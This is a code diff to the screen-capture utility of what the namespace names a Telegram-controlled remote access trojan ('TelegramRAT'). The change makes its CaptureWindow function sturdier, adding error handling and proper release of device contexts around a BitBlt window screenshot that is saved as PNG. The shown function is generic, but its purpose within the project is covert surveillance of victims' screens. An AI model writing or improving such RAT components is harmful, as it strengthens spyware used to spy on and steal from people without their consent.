@@ -1,5 +1,7 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
+using System.ComponentModel;
 using System.Drawing;
+using System.Runtime.InteropServices;
 
 namespace TelegramRAT.Utilities;
 
@@ -7,19 +9,41 @@ static class Utils
 {
     public static void CaptureWindow(IntPtr hWnd, Stream buffer)
     {
-        WinAPI.GetClientRect(hWnd, out Rectangle windowbounds);
+        if (!WinAPI.GetClientRect(hWnd, out Rectangle windowbounds))
+        {
+            throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to retrieve window bounds.");
+        }
 
-        Bitmap windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
+        using var windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
+        using var wndGraphics = Graphics.FromImage(windowCap);
 
-        Graphics wndGraphics = Graphics.FromImage(windowCap);
+        IntPtr graphicsDc = IntPtr.Zero;
+        IntPtr windowDc = IntPtr.Zero;
 
-        IntPtr graphicsDc = wndGraphics.GetHdc();
+        try
+        {
+            graphicsDc = wndGraphics.GetHdc();
+            windowDc = WinAPI.GetDC(hWnd);
 
-        IntPtr windowDc = WinAPI.GetDC(hWnd);
+            if (windowDc == IntPtr.Zero)
+            {
+                throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to acquire window device context.");
+            }
 
-        WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
+            WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
+        }
+        finally
+        {
+            if (graphicsDc != IntPtr.Zero)
+            {
+                wndGraphics.ReleaseHdc();
+            }
 
-        wndGraphics.ReleaseHdc();
+            if (windowDc != IntPtr.Zero)
+            {
+                WinAPI.ReleaseDC(hWnd, windowDc);
+            }
+        }
 
         windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
     }
